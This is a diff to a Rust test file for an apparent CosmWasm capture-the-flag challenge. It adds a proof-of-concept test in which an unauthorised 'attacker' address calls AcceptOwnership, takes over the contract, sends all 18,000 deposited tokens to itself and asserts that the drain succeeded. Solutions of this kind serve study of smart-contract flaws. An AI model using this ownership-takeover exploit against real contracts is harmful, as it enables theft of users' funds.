@@ -3,7 +3,7 @@ pub mod tests {
     use crate::contract::DENOM;
     use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
     use crate::state::State;
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, Empty, Uint128, CosmosMsg, BankMsg, Coin};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -197,6 +197,24 @@ pub mod tests {
             }
         );
 
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(8_000, DENOM)],
+        )
+        .unwrap();
+
         // Ownership transfer
         app.execute_contract(
             Addr::unchecked(ADMIN),
@@ -208,10 +226,30 @@ pub mod tests {
         )
         .unwrap();
 
+        // exploit - simply call accept ownership as attacker
         app.execute_contract(
-            Addr::unchecked("new_owner"),
+            Addr::unchecked("attacker"),
             contract_addr.clone(),
             &ExecuteMsg::AcceptOwnership {},
+            &[],
+        )
+        .unwrap();
+
+        // drain funds
+        app.execute_contract(
+            Addr::unchecked("attacker"),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: CosmosMsg::Bank(BankMsg::Send{
+                    to_address: String::from("attacker"),
+                    amount: vec![
+                        Coin{
+                            denom: String::from(DENOM),
+                            amount: Uint128::new(18_000),
+                        }
+                    ]
+                }),
+            },
             &[],
         )
         .unwrap();
@@ -219,15 +257,28 @@ pub mod tests {
         // Final state
         let state: State = app
             .wrap()
-            .query_wasm_smart(contract_addr, &QueryMsg::State {})
+            .query_wasm_smart(contract_addr.to_string(), &QueryMsg::State {})
             .unwrap();
 
         assert_eq!(
             state,
             State {
-                current_owner: Addr::unchecked("new_owner"),
+                current_owner: Addr::unchecked("attacker"),
                 proposed_owner: None,
             }
         );
+
+        // confirm exploit
+        let bal = app
+        .wrap()
+        .query_balance(contract_addr.to_string(), DENOM)
+        .unwrap();
+        assert_eq!(bal.amount, Uint128::new(0));
+
+        let bal = app
+        .wrap()
+        .query_balance(String::from("attacker"), DENOM)
+        .unwrap();
+        assert_eq!(bal.amount, Uint128::new(18_000));
     }
 }
